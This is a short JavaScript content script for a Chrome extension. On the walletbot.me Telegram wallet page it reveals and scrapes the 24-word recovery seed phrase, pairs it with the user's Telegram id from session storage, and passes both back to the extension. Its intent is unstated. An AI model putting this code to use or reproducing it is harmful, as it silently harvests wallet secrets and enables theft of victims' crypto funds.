chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log("Đã nhận yêu cầu hành động " + request.action);
  switch (request.action) {
    case "export-seedphase":
      exportSeedphase(sendResponse);
      break;
    default:
      break;
  }
  return true
});

async function exportSeedphase(sendResponse) {
  var currentUrl = location.href;
  if (!currentUrl.startsWith("https://walletbot.me")) return;
  // Recovery phrase
  // Tap to view phrase

  const recoverySeedphaseTag = document.evaluate(
    "//div[text()='Recovery phrase']",
    document,
    null,
    XPathResult.FIRST_ORDERED_NODE_TYPE,
    null
  ).singleNodeValue;
  const tapToViewPhaseTag = document.evaluate(
    "//div[text()='Tap to view phrase']",
    document,
    null,
    XPathResult.FIRST_ORDERED_NODE_TYPE,
    null
  ).singleNodeValue;
  if (!recoverySeedphaseTag) return;
  if (tapToViewPhaseTag) {
    tapToViewPhaseTag.click();
    await sleep(1);
  }
  const parentNode = recoverySeedphaseTag.parentNode;
  let retry = 0;
  while (retry < 3) {
    retry++;
    const seedphaseWrapper = Array.from(
      parentNode.querySelectorAll("div")
    ).filter((node) => node.childNodes.length == 24)[0];
    if (!seedphaseWrapper) {
      await sleep(2);
      continue;
    }
    const seedphase = Array.from(seedphaseWrapper.childNodes)
      .map((node) => Array.from(node.childNodes)[1])
      .map((node) => node.innerText)
      .join(" ");
    if (!seedphase) {
      console.log("Seedphase not found")
      return
    }

    let initParams = decodeURIComponent(JSON.parse(sessionStorage.getItem("__telegram__initParams")).tgWebAppData)
    if (initParams?.startsWith("query_id")) {
      const [query_id, _] = initParams.split("&")
      initParams = initParams.replaceAll(query_id + "&", "")
    }
    const { id } = JSON.parse(initParams.split("&")[0].split("=")[1]);

    if (id) {
      sendResponse(`${id},${seedphase}`);
    } else {
      console.log("id not found")
    }
  }
}

async function sleep(delay) {
  await new Promise((resolve) => setTimeout(resolve, delay * 1000));
}
